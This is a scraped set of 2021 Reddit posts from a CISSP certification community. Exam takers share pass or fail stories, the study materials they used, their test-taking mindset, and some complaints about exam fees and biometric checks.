I wanna thank all of you for all the tips in this sub, it's incredible how much info we have here!!

What worked for me:

* Mike Chapple LinkedIn videos
* Sybex practice tests and the Wiley efficient learning app - This is a great platform!
* Destination Certification CISSP Mind Map on Youtube - This guy does a wonderful job of summarizing and explaining key points in each domain. I think they compliment Chapple's videos really well. I would watch Chapple's videos, do some practice questions after the domain, and then watch the mind map video and then do some more practice questions. 
* Why you will pass the CISSP youtube video by Kelly Handerhan - this is a quick one and I watched it at the parking lot of the testing center, as a final pep talk before heading in.  

What didn't work:

* 11th Hour - so general I fell asleep
* [cisspprep.net](https://cisspprep.net) \- I picked it up on here and some of the reviews were great so I gave it a try... the website is somewhat confusing and while I got some good tips I felt like I was mostly looking to understand the author's intent in the question and what they wanted me to select than the actual info that's relevant for the exam

About me:

I have over 15 years of IT experience. I've been on the engineering side, the IT side, and now I work for a security vendor and talk security to CISO/CIO, architects, engineers and a LOT of the material for the exam was driving me nuts because it was just wrong. I knew what was expected of me to answer and so I did just that while grinding my teeth.

&#x200B;

Once again, thank you all for all the good tips!

1760,oakjg4,Provisionally passed @ 107Q in ~130 minutes,"This was the 9th time I have sat for a certification exam in my IT career and I probably studied three times more than I did for any of the other ones - MCSE, A+, Security+. I have around 25 years of experience in the field, most of that as a network admin on Active Directory/Azure. But I've also worked the helpdesk, been Tier 2 and Tier 3 support, and even spent a year as a Logistics Manager, which I was surprised to find got me a lot of experience with the physical security concepts that were on the exam. 

I had actually planned to get my CISSP in 2020, back to back with getting my Security+, but two things happened right when I was about a month or so out from being ready for the exam, I got a new job, and then there was a global pandemic that shut all the testing centers down, so getting the CISSP went up on the shelf, but I did do about 4 hours of training a month on it, which is nowhere near enough but it kept me in the mindset.

Anyhow I got laid off this spring so I decided to go ahead and wrap up the CISSP certification while I have a lot of time to study for it. One thing that really got me into high gear was to go ahead and schedule the exam, once that clock is ticking down, even if it's weeks away, it will keep you motivated! I did find that it was hard to get available spots 1-2 months out for the exam, but if you keep checking the available spots you find that many candidates reschedule their exam when they're about 2-3 weeks out. So when I felt like I was about 3 weeks away from being able to do it I pulled the trigger on the 29th.

Study materials:

* **Original Study Guide (8th ed.) and Original Practice Tests** \- I got the bundle off of Amazon last year when I started studying the first time. I did wind up reading the OSG cover to cover in 5 days but it was towards the end of my studies. It's a tough read but I pushed my way through, and now I think that doing this was critical to understanding the material for the exam. It tied up a lot of small loose ends that I had been struggling on. I strongly suggest reading all of it at least once.  As for the OPTs I registered those online through Wiley Efficient Learning, and downloaded the ios app so I could take the tests on my PC and on my iPhone. I will say the web based version is kind of clunky and I wound up needing to login two or three times to get it to work but it was fine once I got logged in. The ios version seems to be better. The nice thing is that both the web version and the ios version share your results so you can check your progress from either platform.  One thing I didn't realize until late in the game was that if you register the OSG online as well it gives you a completely different test bank of 1300 questions, so be sure to register both products if you get the bundle!
* **Boson CISSP Practice Exam** \- I actually bought this last year as well but I had only taken the first of the five practice exams in it. Yes it's quite technical but just like the question banks from the OSG and OPT, it's testing you on the knowledge base you'll need to pass the real exam. No, the questions aren't like what you'll get on the exam but you must have a complete understanding of all 8 domains and that's what this product is testing you on. The explanations are excellent and will point out where you need to study more. Also at the end of the test it will show you what domains you may be weak on. 
* **My strategy for taking practice tests** \- I'd like to point this out because I think it's important - the CISSP exam is not like other technical certifications you may have done before. Taking practice exams over and over again until you've memorized all the questions and answers is not going to work. My study strategy for the practice tests evolved over time but the way I decided to do it was that instead of taking the same practice exams over and over again I would take them once, then go back and re-take all the questions I answered incorrectly. If I could answer one of the questions correctly then I was done with it and closed those questions out. Fortunately both Boson and Wiley Efficient Learning let you select only the questions you've answered incorrectly for creating custom quizzes so that's where I focused my studies. I did wind up taking the Boson tests twice, about three weeks apart, but out of the 10 practice tests on Wiley Efficient Learning I only took those once. 
* **MFProd on YouTube** \- I did these as part of my study last year before the pandemic hit. If I remember right it was more than 40 hours of material, and was very comprehensive. Unfortunately last year there was some kind of copyright issue with these and they were taken down. A shame, because I made my own ""boot camp"" out of it and took pages and pages of notes which I was referring to as recently as last night.
* **CISSP Cert Prep (2021) on Linkedin Learning** \- since MFProd was gone I needed to use something else, and I had used Mike Chapple's Security+ course on Linkedin to pass that exam so this was the first place I went. Fortunately I discovered that I could get access to LinkedIn Learning for free with my local library card! So I signed up for a library card and then got access to the LIL site. It's more or less the video version of the OSG so it's a bit dry and was kind of a grind but I watched all of it and got myself back up to speed.
* **Kelly Handerhan videos on Cybary** \- everyone talks about watching these and there's a good reason why - Kelly is uniquely skilled in explaining some of the harder to understand concepts you'll need to understand for the exam. After watching this I had Kerberos down solid. It's not like the LinkedIn Learning course in that it's much shorter and not as comprehensive so this is something you should watch towards the tail end of your studies, I was most of the way through this when I scheduled my exam time 3 weeks away.
* **CISSP MindMaps on YouTube** \- these are pretty good, when I was weak on a domain in the practice tests I would go back and watch the MindMap videos for the domain I needed to brush up on. 
* [**CISSPrep.net**](https://CISSPrep.net) **practice exams** \- this was the first of the HARD practice tests that I purchased. Some of the questions are a little rough around the edges but they're quite difficult and they have a LOT of practice tests. The exams are only 50 questions but they're hard, and it will take you a while to get through them. I only did about 5 of these in the end but the explanations are good and once I was done with Boson and WEL, these got me ready for what the real exam would be like.
* **CISSP Mindset Academy practice exams** \- these are also HARD questions and they've been updated for the new material on the 2021 exam. I took both exams just last week and was only able to score in the 50% range on them, that was a bit worrying to me until I found out that's a completely normal score for someone who is about ready for the exam. Once again, I would do these after you've already completed Boson and WEL- these get you ready for the real thing. These tests and the next one are both on Udemy. 
* **HARD CISSP practice questions #1 Thor Pedersen** \- for me this wound up being the final go/no-go for sitting the real exam. I decided that if I was under 50% the first time I took it I was not ready and would have to re-schedule the exam. I scored 55% when I took it last Sunday. I decided I was ready to go. Thor is the guy who says you should do 5000 practice questions before going for the exam, and I tend to agree with this. I'm not sure if I did 5000 questions but I'm pretty sure I was over 4000.
* **Eleventh Hour CISSP Study Guide** \- I got the audiobook version of this and listened to it all the way through on the very last day at 1.3x. Finished it right before I went to sleep on the last night before the exam.
* **Why You WILL Pass the CISSP Kelly Handerhan, Larry Greenblatt CISSP 2020 Exam Tips, The CISSP Mindset: How to ""Think like a Manager"" and PASS!**  \- watched these three videos right towards the end. Heck, the last one I watched in the parking lot of the testing center. These put you in the right manager/advisor mindset to take the real exam. Want to know why a lot of people fail the exam on the first try? They didn't have the manager/advisor mindset going into the exam, that's why.

So as others will tell you the questions you get on the practice exams aren't like what you'll see on the real exam and this is quite true, especially for the WEL and Boson stuff. The hard exams I listed are closer to the real thing though. 

Like everyone tells you, I wasn't sure if I had passed or not when the test ended. When I got to question 101 I knew it was really serious at that point, and by then time management was becoming an issue. Definitely read every question on the exam more than once! There were a couple of times when I looked at the answers and thought ""all of these are right answers"" and then I would find a single word in the question that made only of the answers the correct one. Those were the ""A-HA! GOT YOU!"" moments. (imagine the gif with Leonardo DiCaprio pointing at a tv screen here). There were also a couple of ""What the heck are they even trying to ask me?"" moments. I gasped when the test suddenly ended at question 107 and wasn't 100% certain how I had done until I opened the printout the lady at the front desk handed to me. I actually had to check that exam sheet a couple of times just to be absolutely certain I hadn't hallucinated the words ""Congratulations!"" and ""you have provisionally passed"".

By the way both this subreddit and the Certification Station discord server were critical in getting me that passing score. I was checking posts in here every single day and hanging out in the # cissp room on the discord server. 

Thanks everybody and if you have any questions I'll be happy to answer them.",2021-06-30
1761,oa20k3,Passed CISSP first attempt (4 week study),"A little background - I’ve been in the industry for 20 years and have a degree in IT (Network Management and Infrastructure).  I work for a company doing cyber security software integration, testing, and support. Much of what I do is more in the CEH realm and I have a broad background that includes management so all of this certainly helped.  I also own a Technology consulting and support company providing cloud solutions, network architect/implementation services etc.

The company I work for won a contract that requires CISSP certified personnel and I was tasked with getting certified with about 30 days notice.  To their credit, they paid for a one week CED Solutions boot camp and gave me an additional week off (paid) to prepare before the exam.   I didn’t want to let them down so I studied like crazy. If I wasn’t on my computer taking ‘cccure’ practice tests, I was on my phone doing practice quizzes from ‘Pocket Prep.’  If I was driving, I was listening to ‘Mind Map’ and ‘Inside Cloud and Security’ YouTube videos.  

The test is no joke! I felt unprepared going in and throughout the test, I was never confident enough to put money on a passing score. I think this is normal and I knew I was answering more correctly than not. So relieved that I can continue my life and enjoy the summer! I would say the biggest help for me was going through practice exams and thoroughly reading explanations for every answer.  I already knew things like the OSI model, common port numbers, PKI etc. but I still reviewed every explanation as I went through practice questions.  My attitude going in was, I’m not gonna stress over a fail. I planned to study harder and attempt again in 30 days. It didn’t help that my family, coworkers and friends knew I was studying and all wished me luck… that just added pressure I didn’t need. Or maybe I did need the pressure. I’m just glad I passed. Good luck to all in your endeavors!",2021-06-29
1762,oa79co,Provisionally passed 21 June 2021,"I have followed this subreddit for a long time and wanted to contribute.  I provisionally passed on 21 June on my first attempt.  The test stopped at 137 questions with about 40 minutes remaining.  Like many others have posted, I did not feel ready.  

My study materials were:
1) The Official Study guide:  I read it cover to cover before using any other materials. Dry reading but it was a goal to get through it. 
2) Mindmap videos: These were an excellent resource.
3) Boson Practice exams:  Good resource for gaining insight on areas to focus and follow up on.
4) Thor Pederson on Udemy:  I got through the first 6 domains and then just used the practice exams.
5) Kelly Handerhan:  Listened to her course while driving and doing other tasks.  Also, Why you will pass the CISSP was key for getting the mindset right to take the test. 
6) 11th Hour study guide:  Good resource for a refresher during the last week of my study plan.
7) Various other reading materials such as Memory Palace, Sunflower guide and various NIST documents.

1763,oa7l7s,Is there any hope for someone like me?,"I’ve been in IT for a total of about 5 years. One year in Help Desk, three years in Desktop Support, and about one year in my current SysAdmin role. I have my Network+ and Security+ right now and really want to break into the InfoSec side of things. Every job posting says that CISSP is either preferred or required so I’ve been looking into it and took a couple of pre-assessment tests and made 70’s on both of them. The task still feels daunting because I’ll see people post here with 10-20 years of IT and InfoSec experience and *still* feel like the test was difficult. Is there any hope in me passing CISSP at my current level, if not what would be a valuable next step to try and get into this side of IT? 

Thanks everybody.",2021-06-29
1764,oa0x4s,I passed CISSP on my second attempt. Lessons learned,"I finished the exam about four hours ago after a second attempt from a year ago and here’s what I learned. Tl;dr. “Have a plan, Attack!” > “Have a plan: Attack!”

My background: I’ve been working in security for about five years with a background in IT for about 20 years from desktop support to senior engineer/sysadmin roles. Up until today I had one recently expired ITILv3 Foundations and one expired Security+ certification. For each attempt I did about three months of studying.

1. What did I use to study?
The CISSP Official Study guide
The CISSP Official Practice tests (book)
The CISSP study test and exams mobile apps
11th Hour CISSP
Serious Cryptography (not on the exam but a good book for later to explain that stuff)
Cybrary (all respect to Kelly Handerhan but I only made it through the first two domains)
The Shon Harris book (all respect as well but I probably cracked it open twice during my first attempt and that’s it)
YouTube 
    CISSP Exam Cram Playlist (Inside Cloud Security)
    CISSP Mind Maps (Certification Destination)

2. How did I prep and why did I fail the first time?
I gave myself about three months of study time. I used the mobile app and took practice tests in small bursts (10-20 a day). Minimum of 70% on each of the domains
I planned it out three months in advance but didn’t have a plan other than taking the practice tests over and over. I made it a point to mark and highlight the official book (more like small post it notes but had not dived into the book as much. Two weeks before I skimmed through the 11th hr book writing down notes on paper, one domain per page. Admittedly I didn’t have a plan and wanted to get back to grinding towards OSCP. I also thought about the questions as an engineer and not a manager. I was also in a sour mood about it after reading a few job/certification threads on Twitter. Probably anecdotal but who knows. 

3. What I did this time?
So I mentioned OSCP earlier….I’ve put a lot of effort toward it but in between failing and peer pressure from work (something something jump off a cliff and get a CISSP because your coworkers did). Basically the Friday after failing my OSCP….again, I said @#$& it, I’ll just sign up for the exam and knock this out.

The first thing I did was plan out the next three months of how I was going to study.
The whole three months: listen to the aforementioned YouTube playlists over and over. Even in the background while playing video games or while I would go on walks. I not only wrote out a plan but also joined this subreddit and read a bunch of the passed/failed stories and used some of the least common denominators 

March-April: Finish ALL the practice test questions in the book, graded myself on each domain, and took notes for questions I was clueless on I.e. questions I couldn’t find a wrong answer to.
April-May: I used the mobile app (the official one) again, this time taking the tests in larger chunks (50 questions). Sometimes I would do all the domains, or sometimes a couple. No rhyme or reason, just more exposure and taking note of where I needed to study.
May-June: I wanted to get 100% finished with any of the domains on the app but did at least get a minimum of 70% on all the domains. I took notes from 11th hr again except this time I ignored stuff I was already familiar with. 

A week before and during the exam: In addition to all the other notes I wrote down a few notes for things I was still stuck on (formulas, key lengths, etc), but got some good advice from my boss for the exam on eliminating wrong answers: Use the laminated paper you get for the exam to write A,B,C,D and for each question, put an x next to each possible wrong answer. I also wrote down the formulas and other things I made a point to memorize on the exam. Did I run into a lot of those questions? I honestly couldn’t tell you, but I didn’t want it to be a concern. Aside from that I wrote at the top of the paper YOU ARE THE CEO! to set the framework.

As for the exam, I was feeling confident up until about the last thirty questions and was getting that sinking feeling I wasn’t gonna pass but had already made my mind up and planned out what I was gonna do after so to be honest even after passing I walked out the building saying “@##& this exam” to myself. It has to be the first time I was pissed about something positive I did. 

Anyway, aside from planning things out I wanted to give a shout-out to this subreddit for the stories shared. One thing that can be a double edged sword is seeing all the celebratory posts on passing it. 

Work wise it was also much easier to plan and focus when I would see really smart people exercise the knowledge and not treat it like a “checkbox” cert. I loathe the idea of learning out of arbitrary “obligation”.",2021-06-29
1765,o9wzlc,I PASSED CISSP on 2nd TIME!!!,"So, I stumbled upon this group late in my CISSP studies, probably a couple of days ago to be honest.  I had already scheduled the test and only had a few days from discovering this subreddit before I took it.  Even with that short amount of time, some of the resources on this subreddit were extremely helpful!

I took the CISSP exam this morning at 0800, and after around 110 min and 150 questions...I GOT THE GREAT NEWS THAT I PASSED!  I just really wanted to share this with everyone as I am so ecstatic over this accomplishment!

In case anyone wants to know, below are the study materials that I used.

* I attended a boot camp through Infosec Institute.  Was extremely helpful and they also have a pass guarantee where if you do well in the class but do not do well on the test, you can retake the bootcamp and test without extra charges. 10/10
* Boson Ex-Sim Max - EXTREMELY helpful with explaining why things were the way that they were.  Unfortunately, I remember questions well, so after taking multiple tests through the Boson software I was recognizing questions, but still, would recommend 8/10.
* Wiley Test Bank - Basically the same as Boson, not as informative as to why answers were the right answers, but has a huge test bank and I did not see many questions multiple times. 7/10
* Eleventh Hour - I really enjoyed the summarization that this book used to explain different concepts throughout the Sybex text.  I read it twice through leading up to the test. 8/10
* CISSP Sunflower Summary - A couple days before the test, I read this all the way through while also taking practice tests for each domain as I read through them.  A very good summary of information, but don't use as your ONLY study guide. 6/10
* The CISSP Mindmap Videos by Rob Witcher - Extremely helpful and nice to listen to while I was driving in the car.  A lot of information crammed into short videos, but still helped me solidify some information. 7/10
* Kelly Handerhan Why you will pass the CISSP - CAN'T STRESS THIS ENOUGH, this video was extremely helpful on understand what mindset to have when you are going to take the test.  I listened to this at LEAST 4 times leading up to the test.  Don't think I would have passed without it. 10/10

I am sure there were some more sources that I used, but these were the primary sources.  My biggest advice, don't just take practice tests and questions over and over.  They are helpful, but way more helpful when you understand WHY the answers are the actual answers.

Good Luck to everyone!",2021-06-29
1766,oa36sd,Provisionally passed 29th June 2021,"I had provisionally passed the CISSP exam this morning. It ended at 100 questions around 135 mins mark. 

I scheduled the exam date in April just before the price hike, and I almost exclusively only used Luke Ahmed's Study Notes and Theory practice tests to prepare during the past 2 months.

I had practiced with questions A until 1A one time each, and only used 1 set of practice exam from Boson to check if I was able to complete 150 questions within 3 hours. Overall I think I had reviewed around 1000 questions.

My average score varies between 60+ to 70+, but after taking Luke's hard questions, the real exam questions feel simpler, but not easy by any means.

Though I didn't read any prep books besides reviewing the practice tests, I do have 10+ years of experience in the field which I relied upon heavily. Using similar strategy, I had passed CISM exam in March this year after 2 weeks practising the QAE.

On the last day before the exam, I had also watched some of the Destination Certification CISSP videos on Youtube and I found them to be very helpful in solidifying the concepts. I wish I had watched all of them earlier!

I didn't follow any strict study plans, just practiced the questions whenever I can; on the bus, after work while listening to the news, while tending to the baby crying, while accompanying my wife watching Netflix, and even during toilet time lol! I'm fortunate that my wife is very understanding to tolerate my 3AM sleep schedules.

I had seriously considered to reschedule the exam date to have more time to prepare, but I'm really glad that I believe in myself and go ahead anyways. Extremely relieved that it's over now!

Find whatever works for you, and go ahead with it!",2021-06-29
1767,o9xi77,Passed today @100q,"So, I passed the exam today after finishing 100 questions. I will admit I was shocked but of course overjoyed.

I want to thank everyone here for sharing their experiences and insights as it relates to preparation and more.

I took the exam back in 2016 and failed.. I had taken a boot camp and thought I was ready, but I wasn’t and I didn’t have the right mindset going in. Of course I took the test in the old format so I mentally prepared myself for the new style this go round.

In terms of study….
-I read CISSP for dummies back in September and started flagging areas I needed to do further research on to understand. I identified a study plan and then I tried to stick to that. I wasn’t as strict as I could’ve been during the holidays and beginning of the year, so I had to really buckle down the last month and a half/two months before the exam.

-sunflower: it was okay I mean I read a few times but it just wasn’t for me. Maybe the way the information was setup just couldn’t work for my thought process. But still good to glance at.

-Sybex book: I tried to read cover to cover but it was hard to get through after a while I started using it as reference for things I couldn’t grasp. I did do the practice questions too.

-BOSON: you can’t skip this. While the questions are overly technical they help reinforce and identify what you are weak on. Do each test once and that’s it. If you keep doing them repeatedly you won’t learn anything. Just use them to get a sense of where you are and make adjustments to your study plan accordingly.

-Thor’s courses on Udemy I listed to the audio of the videos to and from work for the last 6 weeks. I took the practice tests at the end of each chapter and at the end of each course.

-CISSP ALL IN ONE  by SHON HARRIS.. I loved this book. Absolutely loved this book because I felt it was easier to read just overall easier to digest. I did practice questions at the ends of each chapter and also read the bullet lists of quick tips at the end to refresh myself the day before the exam. 

-Thor’s hard questions. I purchased them as soon as they were released and took all four. Understand that these are really hard and you will likely score lower here than you have on other practice questions. I will admit I scored horribly but realized there were a few things I was getting confused on and that I really need to take time and review some areas I assumed I just knew because they were directly related to my day to day job. I reviewed them and even found diagrams online to help me better understand. I’m more of a visual person so after a while the text is just gibberish to me. Pictures help a hell of a lot.

-this leads me to cheat sheets. I found Comparitech’s sheets online and found them easier than sunflower to digest. Granted printing some of the domains did the cheat sheets no justice because it was too small to read. I have a large tv screen to view things so for me it was better to read digitally. 

-Kelly Handerhan’s Why You Will Pass the CISSP 10 minute video. I read it before I began my study plan and again this morning before the test. Let me tell you, she reinforces the mindset and encourages you to find that confidence from within to really tackle this exam and come out a winner.

The main thing I would say is find a way that works for you. Books, pictures, video, audio.. whatever. At the end of the day you can do it.. you can pass! Just give yourself time.",2021-06-29

1769,o9m7p4,1st Attempt: Passed at Q101 ~100 minutes,"Morning All - 

Took and passed the CISSP this morning on my first attempt. If I can pass it on my first attempt, then any of you can. It took me around 100 minutes and 101 questions.

Like many have posted here before, the exam provided many challenging questions, and it felt like I was in the ring with Mike Tyson for 12 rounds. When the screen went blank after Q101 I was pretty nervous that I failed, because I did not feel that I was doing THAT well. However, I passed. Below is a little about me and how I prepared.

Of Note: It is key to remember that there are ""Developmental Questions"" embedded. Seeing those provided some challenges, but if you see some questions out of the ordinary or seem like content you did not see in your studies, do not worry. Additionally, I took the approach of the CAT is here to help. It is here to keep you from failing by providing questions to keep you at/near a passing score. I believe that mentally helped significantly.

1770,oa1kel,Requiring bio-metrics for verification?,"In my country, I'm required to provide '100 points of ID' which is sufficient for most things including opening a bank account, or going to court. 

IMO Requiring bio-metrics such as hand-prints or for verification during assessments is not appropriate, both because it's a collection of private information but also because it's not in-line with the security requirement of the exam. I think CISSP needs to reevaluate this option. This is a complete invasion of privacy and not appropriate, make worse so by the fact that NO actual information is provided relating to restrictions or retention on the bio-metrics collected, this is in complete contradiction to the intended content within the damn exam!

1774,o8vuxh,Passed first time. 113 questions in 90 minutes.,"I passed on 21/6 and have been processing my thoughts on the entire journey before posting here.

# Relevant background:

* **BSc in Computer Science** from the University of Manchester
* 5 yrs at **Cisco** working on threat intelligence
* 1 yr at **CyberArk** as Security PMO for R&D
* 1 yr at **Deloitte** as a Senior Cybersecurity Consultant
* 2 yrs at **Microsoft** as a Senior Content Developer for Azure security products

I started looking into CISSP in my time at CyberArk but only really kicked off my proper studying 8 months ago.

# Resources I used:

|Resource|Format/location|Notes|
|:-|:-|:-|
|How To Think Like A Manager for the CISSP Exam (Ahmed, Luke)|Kindle edition|Read cover to cover. I found the advice and framing very helpful. (8/10)|
|CISSP Official Study Guide, 8th edition |Physical book|Read first 100 pages then used as reference. I found the style a little dry, the size intimidating, and the content occasionally lacking - a few times I came to this subreddit in frustration about missing topics. (6/10)|
|CISSP Official Study Guide, 8th edition |Digital edition (via [oreilly.com](https://oreilly.com))|This was where I consumed more of the OSG and a full-text search of a book is SO much more useful than an index which only has partial coverage. (7/10) |
|Eleventh Hour CISSP, 3rd Edition |Audio book|Listened all the way through twice. (7/10) |
|CISSP Course by Shon Harris |Videos (via [oreilly.com](https://oreilly.com)) |I found it insufferable how she began EVERY SINGLE short video with the word 'Now'. Couldn't listen after I noticed this behavioural tic. (1/10) |
|CISSP, Second Edition by Sari Greene|Videos (via [oreilly.com](https://oreilly.com)) |She suffers from the same verbal tic as Shon Harris: an overreliance on the word ""Now"" as a way to start a sentence or segway between ideas. It's really annoying after a very short time and so I had to quit after lesson 6. She also can't say ""hierarchical"" (but repeatedly does so, leaving out the second 'c'). (3/10) |
|Kelly Handerhan's cybrary course |Cybrary|Excellent. (8/10) |
|Destination Certification's Mind Map series|YouTube|As others have said, I don't know how/why these are free. But they're freaking awesome. I took a week of study leave before the exam and these were the core part of that week. (10/10) |
|Prabh Nair's coffee shots |YouTube|Very helpful for filling specific knowledge gaps. And his exam summary tables are really useful. (8/10) |
|Inside Cloud and Security's CISSP Exam Cram|YouTube|Attacks and countermeasures, updates for the 2021 exam, and more. Great stuff. (8/10)|
|Kelly's Why you WILL pass the CISSP|YouTube|It's just a really useful reminder of the mindset. Watch it. (10/10)|
|Craig Cunningham ran a free online CISSP Review session|[Nomad-sec.com](https://Nomad-sec.com) |Really enjoyed this. I definitely benefited from the overall aproach and hearing him work through various ideas. (7/10)|
|[CISSPREP.net](https://CISSPREP.net) practice exams |[CISSPREP.net](https://CISSPREP.net)|Really useful. I took 3 of the 1 hr exams. (8/10)|
|Larry Greenblatt's ""CISSP 2020 Exam Tips""|YouTube|Superb! Watched this on the day of the exam and it really helped solidify the mindset. (10/10)|
|Darknet Diaries |Podcast by Jack Rhysider |Jack's got an interesting way of presenting stories and they're often a good application of the issues covered in the study material. Occasionally, he comes across as a little *too* disappointed that the criminals he's covering get punished. (7/10)|

# Thoughts on the value of this whole process:

I've read a lot of negativity about the cert. Plenty of people (including current CISSP holders) who really don't think it's worth the paper it's printed on. At times, it certainly feels more like a money-making operation than a real 'test' of your knowledge. The annual fee of $125 also feels very steep, and unrelated to the goals. The fact that it's payable in the first year when they've already had $700 for the exam also feels pretty unreasonable.

I wasn't impressed with the quality of the questions in the exam. One in particular had a typo that enormously impacted the meaning of the question. I can't go into details, but the way it was written made no sense and I had to infer the intention. I noted it for reporting afterwards but I was too pumped up from the end of the test to actually do anything on the day. 

So now I have my provisional pass, and I'll have to pay my annual subs, and the exam scraped the surface of my knowledge, but was it worth it? I genuinely think I'll only be able to answer that with the benefit of hindsight a few years from now.",2021-06-27

1785,pabhis,Provisionally passed! Here's what worked for me.,"I provisionally passed!  I am posting this to give back because I found these kinds of posts motivating when I was preparing.  Also, it's a little cathartic.  Of course, your experience will be different but here's what worked for me.

For context, I have around 15 years of experience in cyber security technical and management roles, and had just never got around to doing the test.  Like others, booking a date helped sharpen my focus.  

I have experience in most of the domains except SDLC, so my study needs were to validate what I thought I knew and then to fill in gaps where I didn't have as much experience.  It turned out I had more gaps than expected in domains I thought I was strong in (eg. crypto), and fewer in the gaps where I thought I was weak (eg. SDLC).  I also have a lot of multiple choice test experience from other exams like the LSAT, and this definitely helped.

**My approach**

\- I did practice questions with the Pocket Prep app (now called IT & Security) to assess where I stood on the domains.

\- Then I zeroed in on my weak domains and topics I kept missing in practice.  I used ""70 Tips and Tricks for Mastering the CISSP Exam"" by R. Sarma Danturhi to get a good, concise overview of specific topics.

\- After reaching saturation on Pocket Prep I started doing the Boson practice exams.  I made careful notes from the Pocket Prep and Boson explanations of questions I missed, and made flashcards with a free app called Rolandos to drill on recurring gaps.

\- I prioritized rote memorization of only a handful of core concepts that practice exams showed I was likely to need.

**General advice**

\- **Plan and visualize your visit the day** before to minimize the mental load that will be on you that day.  Look up the exam site in google maps.  Check exterior and interior photos if there are any.  Figure out parking or transport and book in advance if you can.  Plan what you'll wear into the exam room which may be warm or cool (likely to be warm given the PCs used for the exams).  Gather your IDs (you likely need at least 2) and any needed supplies (water, protein bars, etc.) in a bag that can fit in a small storage locker.  Check Covid mask requirements.  

\- Prepare yourself mentally to do 150 questions and to push onward without hesitation or self-pity if you go past 100.  A pass is a pass.

\- To paraphrase Bruce Lee, avoid practicing while overly tired.  If I was too tired, my practice scores dipped, drove down my average, and demotivated me.  When this happened, I put everything away and came back the next day, but I also made sure this didn't become an easy excuse.

\- Don't cram.  The day before my exam, I stopped studying mid-day and binged Netflix with a bag of chips in the evening.  The morning of, I was tempted to do some last minute review but stopped.  I told myself 20-30 minutes of review wasn't going to make a difference and it didn't.

\- If you have to wear a mask, take time to find one you'll be comfortable in for 1-3 hours.

\- Be ready for some bad grammar on some questions and answers that impacts their meaning; you just have to deal with it as best you can.

\- Review at least one current study resource published within the last year to prevent you from being blindsided by a new cutting edge topic or technology.  I found Mike Chapple's LinkedIn videos good for this.

**What was useful**

\- The Pocket Prep app was my main weapon of choice.  It was on my phone so I could do a quick quiz whenever I had a few minutes of downtime.  I think this was critical to getting lots of reps in.  

\- The Boson practice exams were quite good because they were challenging and very different than the Pocket Prep questions.  It was a good way to double check I was where I thought I was on the domains, and it spotlighted some new topics I hadn't encountered before.  Check this subreddit for a current discount code before you buy.

\- Danturthi's book was good for concise summaries of key topics in each domain.  He also emphasizes reading questions carefully and refactoring them in your head to remove irrelevant language, which I thought was a sound approach.

\- I found Chapple's LinkedIn videos to be up to date, well presented, and detailed.  They were also indexed to make skipping to a specific subject easy.  However, I don't learn efficiently from videos so I mostly used these to zero in on specific topics.

\- Kelly Handerhan's ""Why You Will Pass"" is a free, short, and worthwhile YouTube watch, even if just to reinforce that you should think like a manager.  I am one, so this wasn't a stretch, but it is a critical mindset to bring into the exam.

\- There are some cheat sheet style summaries which are posted in this subreddit which I found to be helpful.

**What wasn't useful**

\- I did not find the official ISC2 study app to be useful.  It didn't offer different study modes or statistics, and I think the question banks in Pocket Prep and Boson are superior for learning the domains holistically.

\- I found Kelly Handerhan's Cybrary videos to be a bit too high level for me, but I think they would be a good entry point for someone new to the field.  Her videos are very down to earth and accessible.

\- I felt that the explanations in Pocket Prep and Boson adequately covered the Shon Harris and Chapple books, so I did not feel it necessary to buy them having drilled these apps.

I hope this is helpful! Good luck!",2021-08-24

Though this post is not about passing CISSP, but I attended my CISSP certifcation in 2018, continuously improve and learn. Being certified in CISSP isn't an end but a begin of your new journey. 

It opens you a doorway and demonstrate you have sufficient knowledge in various security domains (now 10?) and where  you can then focus on what you are lacking or you are interested further.

In between the years after certified in CISSP, I have also certified in ISACA's 5 CXXX exams. 

Excited to submit my final endsorment for ISC2 to review. 

And should I say ""graduate"" from ISC2?

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken). But SSCP is a good interim step for you to prepare your CISSP if you don't have the full domain knowledge and experience.

1793,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
